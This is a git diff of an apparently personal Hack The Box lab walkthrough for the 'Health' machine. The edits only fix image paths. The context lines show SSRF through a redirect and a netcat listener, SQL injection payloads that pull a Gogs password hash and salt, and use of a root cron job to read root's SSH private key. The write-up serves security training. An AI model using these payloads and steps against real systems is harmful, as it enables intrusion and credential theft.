@@ -23,7 +23,7 @@ image:
 | OS | Linux ![](https://www.hackthebox.com/images/linux.png){: width="32" height="32" } Windows ![](https://www.hackthebox.com/images/.png){: width="32" height="32" } |
 | Difficulty |  |
 | Difficulty Chart |  |
-| Radar Graph | ![](../assets/img/health-radar.png){: width="330" height="250"} |
+| Radar Graph | ![](../../assets/img/health-htb/health-radar.png){: width="330" height="250"} |
 | Creator | [![](https://www.hackthebox.eu/badge/image/476556)](https://www.hackthebox.eu/home/users/profile/476556) |
 | Name | <https://www.hackthebox.com/home/machines/profile/491> |
 
@@ -48,7 +48,7 @@ This could allow for an Server Side Request Forgery (SSRF attack). It may be pos
 
 The web application does not all you to add the target system as the monitored URL. Even if we try to trap the request and modify the request which suggests the check is being done server side. 
 
-![](../assets/img/health-error01.png)
+![](../../assets/img/health-htb/health-error01.png)
 
 To get around this restriction we can try to redirect to the server that you are trying to access. Our server will send a redirect to an internal server. The vulnerable server will then make a new request to the redirected location and return the results of that internal service. 
 
@@ -89,13 +89,13 @@ nc -nvlp 1338
 
 Fill out the form on the page to monitor your redirect on port 80 and the webhook to be your netcat listener then click Test.
 
-![](../assets/img/web-hook-application.png)
+![](../../assets/img/health-htb/web-hook-application.png)
 
 We find out that it is a Gogs version 0.5.5 server listening on that port. This is a git server similar to GitHub or GitLab but written in GoLang.
 
-![](../assets/img/health-gogs-service01.png)
+![](../../assets/img/health-htb/health-gogs-service01.png)
 
-![](../assets/img/health-gogs-version01.png)
+![](../../assets/img/health-htb/health-gogs-version01.png)
 
 ## Exploiting Gogs
 
@@ -211,7 +211,7 @@ sudo python3 redirect.py 80 "http://10.10.11.176:3000/api/v1/users/search?q=e')/
 ```
 Success we see that the sqlite version is 3.8.5
 
-![](../assets/img/sqlite-version.png)
+![](../../assets/img/health-htb/sqlite-version.png)
 
 
 Now that we know what database it is, we can get the tables that are available.
@@ -219,7 +219,7 @@ Now that we know what database it is, we can get the tables that are available.
 ```shell
 sudo python3 redirect.py 80 "http://10.10.11.176:3000/api/v1/users/search?q=e')/**/union/**/all/**/select/**/null,null,(SELECT/**/tbl_name/**/FROM/**/sqlite_master),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1--"
 ```
-![](../assets/img/table.png)
+![](../../assets/img/health-htb/table.png)
 
 Get the columns of the table
 
@@ -228,7 +228,7 @@ Get the columns of the table
 ```
 
 
-![](../assets/img/health-db-columns.png)
+![](../../assets/img/health-htb/health-db-columns.png)
 *Looks like I did not mark all of the colums but I got the two that we need most. Can you find the ones I missed?*
 
 Let's get the password:
@@ -237,7 +237,7 @@ Let's get the password:
 sudo python3 redirect.py 80 "http://10.10.11.176:3000/api/v1/users/search?q=e')/**/union/**/all/**/select/**/null,null,(select/**/passwd/**/from/**/user),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1--" 
 ```
 
-![](../assets/img/health-password-in-hex.png)
+![](../../assets/img/health-htb/health-password-in-hex.png)
 
 Let's grab the salt:
 
@@ -245,7 +245,7 @@ Let's grab the salt:
 sudo python3 redirect.py 80 "http://10.10.11.176:3000/api/v1/users/search?q=e')/**/union/**/all/**/select/**/null,null,(select/**/salt/**/from/**/user),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1--"
 ```
 
-![](../assets/img/salt.png)
+![](../../assets/img/health-htb/salt.png)
 
 I have no idea what algorithm is used to hash the password. The good news is that this is an open source application so we can dig through the code if no one else has.
 Lucky for us again someone else dug through the application to find where the password is hashed.
@@ -305,22 +305,22 @@ ssh susanne@10.10.11.176
 Moving on up to root takes a little investigative work but is not all that difficult. 
 
 After the normal enumeration, there really was not anything too interesting to work on so I decided to see if there were any interesting tasks running occasionally. This is usually indicative of another user who has a cron (or other scheduler) job running. The easiest way to monitor these tasks is to use [pspy](https://github.com/DominicBreuker/pspy). Once that is running, there is a command that may stand out: 
-![](../assets/img/interest-cron-job01.png)
+![](../../assets/img/health-htb/interest-cron-job01.png)
 
 That is interesting but I have no clue as to what it is doing. But after some googling around and looking into Laravel, this is basically running whatever code is in the Laravel web application located /var/www/html/app/Console/Kernel.php and the function `schedule`. We can take a look and see what is happening with that code and see that it is getting all of the tasks from the database and then using `HealthChecker`'s `check` function.  After digging around a bit we find that function /var/www/html/app/Http/Controllers/HealthChecker.php. We should also note that it is being rand as `root`. 
 
 The interesting part is that it is using @file_get_contents which could allow us to get a file of our choosing from the system.
 
-![](../assets/img/health-file-get-contents.png)
+![](../../assets/img/health-htb/health-file-get-contents.png)
 Unfortunately, the application blocks us from just getting a file and instead gives us an error.
-![](../assets/img/health-error02.png)
+![](../../assets/img/health-htb/health-error02.png)
 
 However, now that we are on the system, we may  be able to find database creds and change the monitoredURL there?
 
 Back to digging around...
 Learning a bit more about Laravel, it uses a .env file to load environment variables to help with configuration of the application. The .env file is supposed to reside at the root of the application. After looking there and opening the file up we get mysql creds.
 
-![](../assets/img/health-mysql-creds.png)
+![](../../assets/img/health-htb/health-mysql-creds.png)
 
 ```shell
 mysql -ularavel -p
@@ -395,7 +395,7 @@ We will use the file filter to get the file from the local machine instead of us
 
 It worked:
 
-![](../assets/img/rsa_key.png)
+![](../../assets/img/health-htb/rsa_key.png)
 
 Copy and paste it into a file. The easiest way that I was able to do it was to use:
 ```shell
@@ -410,7 +410,7 @@ chmod 600 ./key
 ssh -i ./key root@10.10.11.176
 ```
 
-![](/posts/assets/img/root-txt.png)
+![](/assets/img/health-htb/root-txt.png)
 
 
 This was a really fun box. I hope you enjoyed the walkthrough. If you have any questions or corrections, feel free to contact me on Discord: Man715_#5234. 
